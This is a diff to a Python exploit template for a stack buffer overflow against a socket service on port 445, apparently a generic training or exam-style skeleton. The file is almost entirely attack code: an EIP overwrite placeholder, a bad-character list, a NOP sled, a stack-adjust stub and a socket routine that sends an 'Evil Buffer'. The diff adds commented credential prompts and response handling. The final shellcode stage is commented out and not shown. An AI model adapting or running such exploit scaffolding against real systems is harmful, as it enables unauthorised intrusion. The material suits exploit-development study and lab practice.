@@ -7,6 +7,8 @@ import socket
 ## host information
 host="10.0.0.1"
 host_port=445
+## host_user=""
+## host_pass=""
 
 ## size before EIP/RIP over-write
 buffer_size=3000
@@ -18,7 +20,7 @@ buffer_size=3000
 eip="\xef\xbe\xad\xde"
 
 ## bad characters: \x00
-badChars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
 "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
 "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
 "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
@@ -50,12 +52,12 @@ secstage = "\x81\xc4\x90\xfe\xff\xff\xff\xe4"
 number_of_nops = 10
 nop_sled="\x90" * number_of_nops
 
-## starting buffer
+## starting recon buffer
 ## use \xCC to debug jumping
 padding="\x41" * buffer_size
 the_buffer = padding
 
-## final buffer
+## final exploit buffer
 #padding="\xcc" * (buffer_size - len(nopsled) - len(shellcode))
 #the_buffer = padding + nopsled + shellcode + eip + secstage
 
@@ -63,8 +65,24 @@ the_buffer = padding
 pwn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print "[*] Connecting."
 pwn.connect((host, host_port))
+
+## If connection requires credentials
+## pwn.send("user " + host_user + "\n")
+## msg=pwn.recv(1024)
+## print msg
+## pwn.send("pass " + host_pass + "\n")
+## msg=pwn.recv(1024)
+## print msg
+
 print "[*] Sending Evil Buffer ! Size: " + str(len(the_buffer))
 pwn.send(the_buffer + "\n")
+
+## If a response is required
+#print "[*] Waiting for Response"
+#msg=pwn.recv(4096)
+#print "[*] Response Recieved"
+#print msg
+
 print "[*] Closing Connection"
 pwn.close()
 print "[*] Done !"
